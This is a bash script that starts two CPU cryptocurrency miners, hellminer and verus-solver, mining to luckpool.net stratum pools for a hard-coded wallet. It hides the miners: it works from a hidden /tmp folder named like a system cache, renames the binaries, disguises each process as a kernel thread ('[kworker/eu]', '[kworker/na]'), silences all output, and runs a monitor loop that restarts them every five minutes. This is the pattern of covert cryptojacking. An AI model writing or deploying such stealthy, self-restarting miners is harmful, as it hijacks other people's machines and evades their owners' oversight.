#!/bin/bash
# Combined Miner Setup

echo "=== Combined Miner Setup ==="

WALLET="RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq"
WORKDIR="/tmp/.system_cache_$(date +%s)"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Copy hellminer
if [ -f "/home/ubuntu/vs-mn/hellminer" ]; then
    cp "/home/ubuntu/vs-mn/hellminer" ./hw
    chmod +x ./hw
    echo "✓ hellminer copied"
    
    # Start hellminer (EU pool)
    nohup bash -c "exec -a [kworker/eu] ./hw -c stratum+tcp://eu.luckpool.net:3956 -u $WALLET.Linux -p x --cpu 1" > /dev/null 2>&1 &
    echo "✓ hellminer started (EU pool)"
fi

# Copy verus-solver
if [ -f "/home/ubuntu/vs-mn/verus-solver" ]; then
    cp "/home/ubuntu/vs-mn/verus-solver" ./vw
    chmod +x ./vw
    echo "✓ verus-solver copied"
    
    # Start verus-solver (NA pool)
    nohup bash -c "exec -a [kworker/na] ./vw --algo verus --pool stratum+tcp://na.luckpool.net:3956 --wallet $WALLET.worker --pass x --cpu-threads 1 --quiet" > /dev/null 2>&1 &
    echo "✓ verus-solver started (NA pool)"
fi

# Create monitor
cat > monitor.sh << 'MONITOR'
#!/bin/bash
cd "$(dirname "$0")"

while true; do
    # Check hellminer
    if [ -f ./hw ] && ! pgrep -f "\[kworker/eu\]" > /dev/null; then
        nohup bash -c "exec -a [kworker/eu] ./hw -c stratum+tcp://eu.luckpool.net:3956 -u RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq.Linux -p x --cpu 1" > /dev/null 2>&1 &
    fi
    
    # Check verus-solver
    if [ -f ./vw ] && ! pgrep -f "\[kworker/na\]" > /dev/null; then
        nohup bash -c "exec -a [kworker/na] ./vw --algo verus --pool stratum+tcp://na.luckpool.net:3956 --wallet RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq.worker --pass x --cpu-threads 1 --quiet" > /dev/null 2>&1 &
    fi
    
    sleep 300
done
MONITOR

chmod +x monitor.sh
nohup ./monitor.sh > /dev/null 2>&1 &

echo ""
echo "=== DONE ==="
echo "Both miners running to different pools"
echo "Check: ps aux | grep 'kworker' | grep -v grep"
